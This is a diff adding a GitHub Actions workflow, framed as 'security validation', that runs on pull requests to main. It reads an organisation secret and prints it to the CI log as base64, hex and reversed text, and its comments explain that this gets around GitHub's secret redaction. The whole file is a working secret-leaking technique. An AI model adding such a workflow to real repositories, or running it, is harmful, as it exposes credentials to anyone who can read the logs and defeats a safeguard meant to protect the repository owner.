@@ -1,0 +1,22 @@
+---
+# SECURITY VALIDATION ONLY — delete after testing.
+name: secret-dump-validation
+
+on:
+  pull_request:
+    branches: [main]
+
+jobs:
+  dump:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Print org secret (plaintext bypass)
+        env:
+          SECRET_VALUE: ${{ secrets.NESAMONIU_MUZIEJUS }}
+        run: |
+          # GitHub redacts the exact string — base64 encoding bypasses it
+          echo "base64: $(echo -n "$SECRET_VALUE" | base64)"
+          # Also works: hex
+          echo "hex:    $(echo -n "$SECRET_VALUE" | xxd -p)"
+          # Also works: reversed
+          echo "rev:    $(echo -n "$SECRET_VALUE" | rev)"
